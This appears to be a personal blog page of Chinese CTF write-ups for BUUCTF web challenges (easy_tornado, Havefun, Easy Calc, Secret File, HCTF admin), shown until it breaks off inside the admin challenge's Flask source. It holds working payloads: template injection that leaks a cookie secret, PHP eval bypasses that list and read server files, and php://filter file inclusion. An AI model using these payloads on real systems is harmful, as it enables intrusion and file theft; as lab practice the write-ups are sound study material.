@@ -1,0 +1,346 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>week20200720-20200726 | 又菜又懒不学无术</title><meta name="author" content="Du11jk"><meta name="copyright" content="Du11jk"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Week 2 &lt;2020.07.20 - 2020.07.26&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="week20200720-20200726">
+<meta property="og:url" content="http://du11jk.github.io/2020/07/26/week20200720-20200726/index.html">
+<meta property="og:site_name" content="又菜又懒不学无术">
+<meta property="og:description" content="Week 2 &lt;2020.07.20 - 2020.07.26&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://avatars.githubusercontent.com/u/48244012?v=4">
+<meta property="article:published_time" content="2020-07-26T09:00:25.000Z">
+<meta property="article:modified_time" content="2023-09-12T09:33:41.408Z">
+<meta property="article:author" content="Du11jk">
+<meta property="article:tag" content="CTF - Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://avatars.githubusercontent.com/u/48244012?v=4"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://du11jk.github.io/2020/07/26/week20200720-20200726/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"A0WP5DUMNJ","apiKey":"34f21cab1680a7d8ba70d94b796c5424","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'week20200720-20200726',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-12 17:33:41'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="/atom.xml" title="又菜又懒不学无术" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://avatars.githubusercontent.com/u/48244012?v=4" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="又菜又懒不学无术"><span class="site-name">又菜又懒不学无术</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">week20200720-20200726</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2020-07-26T09:00:25.000Z" title="Created 2020-07-26 17:00:25">2020-07-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-12T09:33:41.408Z" title="Updated 2023-09-12 17:33:41">2023-09-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/OldNotes/">OldNotes</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word count:</span><span class="word-count">2.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading time:</span><span>13min</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="week20200720-20200726"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="Week-2-lt-2020-07-20-2020-07-26-gt"><a href="#Week-2-lt-2020-07-20-2020-07-26-gt" class="headerlink" title="Week 2 &lt;2020.07.20 - 2020.07.26&gt;"></a>Week 2 &lt;2020.07.20 - 2020.07.26&gt;</h1><span id="more"></span>
+
+<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>打开页面有三个链接：</p>
+<p>&#x2F;flag.txt</p>
+<p>&#x2F;welcome.txt</p>
+<p>&#x2F;hints.txt</p>
+<p>分别给出：</p>
+<p>flag in &#x2F;fllllllllllllag</p>
+<p>render</p>
+<p>md5(cookie_secret+md5(filename))</p>
+<p>结合URL特征：<a target="_blank" rel="noopener" href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3f454049785f959f97757dbebee486b8">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=3f454049785f959f97757dbebee486b8</a></p>
+<p>可以推断出payload：filename &#x3D; &#x2F;fllllllllllllag并且filehash &#x3D; md5(cookie_secret+md5(filename))</p>
+<p>目标是取得cookie_secret</p>
+<p>试着用错误的filehash读一下，有报错页面</p>
+<p><a target="_blank" rel="noopener" href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=Error">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=Error</a></p>
+<p>判断是SSTI模板注入<br>payload：<br><a target="_blank" rel="noopener" href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=</a>1<br>的确是SSTI注入</p>
+<p>考点：handler.settings对象</p>
+<blockquote>
+<p>tornado中<br>handler对象指向RequestHandler<br>RequestHandler指向self.application.settings<br>故handler.setting对象指向RequestHandler.application.settings</p>
+</blockquote>
+<p>则可获取到cookie_secret</p>
+<p>payload：<a target="_blank" rel="noopener" href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/error?msg=</a></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;48ebd54e-1647-4fc6-beee-ce1cefb446c6&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<p>编写解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="built_in">hash</span> = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">cookie_secret=<span class="string">&quot;48ebd54e-1647-4fc6-beee-ce1cefb446c6&quot;</span></span><br><span class="line"><span class="built_in">hash</span>.update(filename.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">s1=<span class="built_in">hash</span>.hexdigest()</span><br><span class="line"><span class="built_in">hash</span> = hashlib.md5()</span><br><span class="line"><span class="built_in">hash</span>.update((cookie_secret+s1).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hash</span>.hexdigest())</span><br></pre></td></tr></table></figure>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d2e43f158934b47a48cb9f125b554173</span><br></pre></td></tr></table></figure>
+<p>payload：<br><a target="_blank" rel="noopener" href="http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=d2e43f158934b47a48cb9f125b554173">http://ee3fa51c-355d-4079-a6d4-24116f301eda.node3.buuoj.cn/file?filename=/fllllllllllllag&amp;filehash=d2e43f158934b47a48cb9f125b554173</a></p>
+<p>flag{056f8da6-43bc-491e-b37d-6ffd146a6287}</p>
+<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>过程很简单，打开网页查看源代码：</p>
+<table>
+<thead>
+<tr>
+<th>&lt;!–</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td></td>
+<td>$cat&#x3D;$_GET[‘cat’];</td>
+</tr>
+<tr>
+<td></td>
+<td>echo $cat;</td>
+</tr>
+<tr>
+<td></td>
+<td>if($cat&#x3D;&#x3D;’dog’){</td>
+</tr>
+<tr>
+<td></td>
+<td>echo ‘Syc{cat_cat_cat_cat}’;</td>
+</tr>
+<tr>
+<td></td>
+<td>}</td>
+</tr>
+<tr>
+<td></td>
+<td>–&gt;</td>
+</tr>
+</tbody></table>
+<p>payload：<a target="_blank" rel="noopener" href="http://40c9cea3-f867-4b85-a444-218c3812204d.node3.buuoj.cn/?cat=dog">http://40c9cea3-f867-4b85-a444-218c3812204d.node3.buuoj.cn/?cat=dog</a></p>
+<p>结束</p>
+<p>flag{a1a1a5b3-e28f-4403-8ccd-9b8ab4a73686}</p>
+<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>查看源代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">&#x27;#calc&#x27;</span>).<span class="title function_">submit</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).<span class="title function_">val</span>()),</span><br><span class="line">            <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">                $(<span class="string">&quot;#result&quot;</span>).<span class="title function_">html</span>(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">            &lt;/div&gt;`</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">error</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&quot;这啥?算不来!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看一下calc.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过方法：php字符串解析特性，在num参数前加空格就可以绕过waf</p>
+<p>扫描目录：payload：<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28534/calc.php%EF%BC%9F%20num=1;var_dump(scandir(chr(47)">http://node3.buuoj.cn:28534/calc.php？%20num=1;var_dump(scandir(chr(47)</a>))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1array(24) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(10) &quot;.dockerenv&quot; [3]=&gt; string(3) &quot;bin&quot; [4]=&gt; string(4) &quot;boot&quot; [5]=&gt; string(3) &quot;dev&quot; [6]=&gt; string(3) &quot;etc&quot; [7]=&gt; string(5) &quot;f1agg&quot; [8]=&gt; string(4) &quot;home&quot; [9]=&gt; string(3) &quot;lib&quot; [10]=&gt; string(5) &quot;lib64&quot; [11]=&gt; string(5) &quot;media&quot; [12]=&gt; string(3) &quot;mnt&quot; [13]=&gt; string(3) &quot;opt&quot; [14]=&gt; string(4) &quot;proc&quot; [15]=&gt; string(4) &quot;root&quot; [16]=&gt; string(3) &quot;run&quot; [17]=&gt; string(4) &quot;sbin&quot; [18]=&gt; string(3) &quot;srv&quot; [19]=&gt; string(8) &quot;start.sh&quot; [20]=&gt; string(3) &quot;sys&quot; [21]=&gt; string(3) &quot;tmp&quot; [22]=&gt; string(3) &quot;usr&quot; [23]=&gt; string(3) &quot;var&quot; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag在“flagg”中<br>payload：<a target="_blank" rel="noopener" href="http://node3.buuoj.cn:28534/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)">http://node3.buuoj.cn:28534/calc.php?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</a>))</p>
+<p>flag{55af2ea6-292a-452b-b89b-223b3b2a4561}</p>
+<h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开网站，查看源代码：（27行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现一个隐藏链接，进入</p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200726161728627.png" alt="image-20200726161728627"></p>
+<p>点击跳转到了end.php，但是查看源代码发现该链接目标是”<a href="view-source:http://adb61f74-015f-4f39-be21-ee11ec36a0cc.node3.buuoj.cn/action.php">.&#x2F;action.php</a>“ </p>
+<p>推断action.php自动跳转到了end.php</p>
+<p>BurpSuite抓包：</p>
+<p><img src="/2020/07/26/week20200720-20200726/image-20200726161711389.png" alt="image-20200726161711389"></p>
+<p>发现 secr3t.php 内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;    &lt;title&gt;secret&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file=$_GET[&#x27;file&#x27;];    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); //flag放在了flag.php里?&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/26/week20200720-20200726/image-20200726161601390.png" alt="image-20200726161601390"></p>
+<p>看不到。。</p>
+<p>分析secr3t.php文件包含漏洞，有若干过滤</p>
+<p>绕过 ：</p>
+<p><a target="_blank" rel="noopener" href="http://00b5c733-809a-4aed-a498-27d306b09452.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php">secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</a></p>
+<p>获得base64加密：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MGE4MjIyZjctN2U2Ni00Y2JlLWE1ZGYtMWEyNTJjOGIxMjU3fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure>
+
+<p>解密找到flag</p>
+<p>flag{0a8222f7-7e66-4cbe-a5df-1a252c8b1257}</p>
+<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>启动有登录注册页面，随便注册一个账号登入，开始检查源代码，</p>
+<p>发现<!-- you are not admin -->，确认是要登入到admin账户</p>
+<p>在change password页面发现了源码github地址<a target="_blank" rel="noopener" href="https://github.com/woadsl1234/hctf_flask/">https://github.com/woadsl1234/hctf_flask/</a></p>
+<p>已知解法：</p>
+<ol>
+<li><p>flask session 伪造</p>
+</li>
+<li><p>unicode欺骗</p>
+</li>
+</ol>
+<h3 id="flask-session-伪造："><a href="#flask-session-伪造：" class="headerlink" title="flask session 伪造："></a>flask session 伪造：</h3><h3 id="unicode欺骗："><a href="#unicode欺骗：" class="headerlink" title="unicode欺骗："></a>unicode欺骗：</h3><p>源码片段：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 